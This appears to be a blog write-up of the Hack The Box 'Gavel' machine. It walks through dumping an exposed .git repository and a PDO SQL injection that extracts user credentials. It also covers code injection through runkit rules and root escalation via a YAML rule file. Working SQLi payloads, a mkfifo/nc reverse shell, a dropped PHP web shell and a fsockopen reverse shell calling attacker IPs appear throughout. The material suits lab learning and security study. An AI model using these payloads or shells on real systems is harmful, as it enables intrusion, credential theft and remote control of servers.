---
layout: post
title: HTB Gavel - Writeup
date: 2025-12-28
categories: [ctf]
tags: [ctf, misc]
---

*Probably the craziest SQLi I exploited during 4 years of CTFs. PHP code review at its finest.*

![](/assets/images/htb_gavel/banner.jpg)

- CTF: [Gavel](https://app.hackthebox.com/machines/Gavel)
- Difficulty: Medium

## Port scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web
### BAC/IDOR
*This vulnerability is out of the scope of the challenge.*

The endpoint `/inventory.php` is vulnerable to BAC/IDOR. I created 2 users and placed some bids. With user A I'm able to see user B's inventory by making a POST request and changing the parameter `user_id` with other ids.

![](/assets/images/htb_gavel/htb_gavel_idor1.png)

In the screenshot above, I can see different inventories with the same account (notice the highlighted session cookie).

### Dir scan
With FFUF I found a `.git` directory exposed.

![](/assets/images/htb_gavel/htb_gavel_ffuf.png)

### Dump .git
I dumped the `.git` directory with [git-dumper](https://github.com/arthaud/git-dumper).
```sh
# install
mkdir git-dumper && cd git-dumper
virtualenv .venv
pip install git-dumper

# dump
git-dumper https://vulnapp.com/.git ./dump-output
```

### Code analysis
#### Credentials hunt
Credentials in `includes/config.php`
```php
define('DB_HOST', 'localhost');
define('DB_NAME', 'gavel');
define('DB_USER', 'gavel');
define('DB_PASS', 'gavel');
```

#### SQLi Hunt
There's a string interpolation in a query in the file `inventory.htb`.

![](/assets/images/htb_gavel/htb_gavel_sqli_analysis.png)

The code is trying to sanitize the `sort` parameter. It removes backticks from user input (`$sortItem`)  and later surrounds the cleaned value with backticks.
```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$col = "`" . str_replace("`", "", $sortItem) . "`";
```

Finally, if `$sortItem` value is different from `quantity`, the variable `$col` is interpolated into the query.
```php
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
$stmt->execute([$userId]);
$results = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

When the `sort` parameter is set to an existing column ("item_image"), the server executes the query correctly.

![](/assets/images/htb_gavel/htb_gavel_sqli_poc.png)

## Exploit the SQLi
It took me some time to find a way to exploit this unusual vulnerable code. Looking for "php pdo vulnerabilities", I found [this article](https://gbhackers.com/php-pdo-flaw/). The challenge vulnerable code is indeed based on the one in the article, except for the fact that the single backticks are not striped but replaced with two backticks.
```php
<?php
$dsn = "mysql:host=127.0.0.1;dbname=demo";
$pdo = new PDO($dsn, 'root', ''); 
$col = '`' . str_replace('`', '``', $_GET['col']) . '`';
$stmt = $pdo->prepare("SELECT $col FROM fruit WHERE name = ?");
$stmt->execute([$_GET['name']]); 
$data = $stmt->fetchAll(PDO::FETCH_ASSOC); ?>
```

These were the original payloads in the article.
```sql
x FROM (SELECT table_name AS ‘x from information_schema.tables)y;#
?#%00`
```

These are the same payloads modified in order to obtain the DB version.
- user_id
```sql
x` FROM (SELECT @@version AS `'x`)y;-- -
```
- sort
```sql
\?-- -%00
```

![](/assets/images/htb_gavel/htb_gavel_sqli_db_version.png)

**Exploit the SQLi to steal credentials**:
- `user_id` parameter:
```sql
x`+FROM+(SELECT+CONCAT(username,0x3a,password)+AS+`'x`+FROM+users)y%3b--+-
```
- `sort` parameter:
```sql
\?;-- -%00
```

A backslash was added before the question mark to prevent breaking the query and let PDO parse it as a placeholder. The `'x` part was surrounded with backticks. And finally the comment character `#` was replaced with `-- -` (double dashes and a space, the last character prevents eventual space stripings).

The `sort` payload work like this:
- `\?;-- -%00`: the `sort` parameter is concatenated directly in the string as `$col` variable. Since the concatenation is done before PDO parses the query, the question mark inserted makes PDO parse it as the first placeholder, so the `user_id` payload is inserted right after the `SELECT`. Finally, the NULL BYTE makes the MySQL driver ignore what comes after the injected query, to prevent failure.

Credentials exfiltrated.

![](/assets/images/htb_gavel/htb_gavel_sqli_dump_db.png)

### Hash cracking
![](/assets/images/htb_gavel/htb_gavel_hash_crack.png)

## RCE
Since in the admin panel you can modify bids descriptions and rules, it's worth it taking a look at how these parameters are handled.

![](/assets/images/htb_gavel/htb_gavel_grep_rule_param.png)

When a user makes a bid, a request is sent to `includes/bid_handler.php`. The file checks if the bid is generally valid first (enough money, the new bid is bigger than the actual one, etc), then, it checks the bid against a custom rule, created by the auctioneer user for the single auctions.

Every time a bid is made and generally validated, the rule specified by the auctioneer for the single auction is queried from the DB and added at runtime to the code by the function `runkit_function_add`.

![](/assets/images/htb_gavel/htb_gavel_rce.png)

The function lets users add arbitrary code as a new function called "ruleCheck".

### Exploit the RCE
I tried to directly execute oneline reverse shells, but the connection closes immediately.
```php
system('rm /tmp/p;mkfifo /tmp/p;cat /tmp/p|sh -i 2>&1|nc 10.10.14.84 4444 >/tmp/p');
```

Maybe it's not the best way to exploit this flaw, but it's the fastest that occurred to my mind: dropping a webshell on the target.
```php
fwrite(fopen("webme.php", "w"), '<html><body><form method="GET" name="<?php echo basename($_SERVER[\'PHP_SELF\']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET[\'cmd\'])){ system($_GET[\'cmd\'] . \' 2>&1\');}?></pre></body></html>');
```

![](/assets/images/htb_gavel/htb_gavel_webshell.png)

From there I've been able to spawn an `mkfifo` reverse shell and connect from my terminal.

I created a script to automate the exploit process ([GitHub link](https://github.com/byt3loss/OffensiveScripts/tree/main/Others/Gavel_RCE)).

![](/assets/images/htb_gavel/htb_gavel_rce_script.png)

Usage: `python3 gavel_rce.py -s <SESSION_COOKIE> -lh <LHOST> -lp <LPORT> -i <AUCTION_ID>`

The flags `-w` and `-f` are optional:
- `-w`: web shell name (default: "websh.php")
- `-f`: FIFO file name (default: "p")

## Privilege Escalation
The user auctioneer's password is the same dumped from the database (it doesn't work from SSH). 

![](/assets/images/htb_gavel/htb_gavel_foothold.png)

User auctioneer is member of the custom group "gavel-seller". Using find to search for files owned by that group, I found the executable `gavel-utils`.
```sh
find / -group gavel-seller 2>/dev/null
```

The executable accept YAML files with bidding items details, judging from the required fields.

![](/assets/images/htb_gavel/htb_gavel_gavel_utils.png)

The logic behind this privilege escalation, is the same of the RCE in the webapp. The `rule` filed must be handled by the `runkit_function_add` again.

After some testing, trying to run commands on the host with `system()` and being blocked by the PHP sandbox, I opted for a simple flag exfiltration with PHP file reading a writing functions.
```yaml
name: get root flag
description: get root flag
image: none.png
price: 100
rule_msg: root flag
rule: file_put_contents('/home/auctioneer/readme.txt', file_get_contents('/root/root.txt'), );return false;
```

Save the previous code to a YAML file. Make sure you create the file `readme.txt` before executing `gavel-utils`, so PHP does not create it with root privileges making it unreadable for others.

```sh
touch ~/readme.txt
gavel-utils submit get_flag.yaml
cat ~/readme.txt
```

A reverse shell can be also obtained with the `fsockopen` function.
```yaml
name: revsh
description: revshells.com
image: none.png
price: 100
rule_msg: root me!
rule: $sock=fsockopen("10.10.15.178",9001);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Even if `gavel-utils` returns the error "`Illegal rule or sandbox violation.SANDBOX_RETURN_ERROR`", the target spawns a root shell and connects on the listening port.

![](/assets/images/htb_gavel/htb_gavel_root_revshell.png)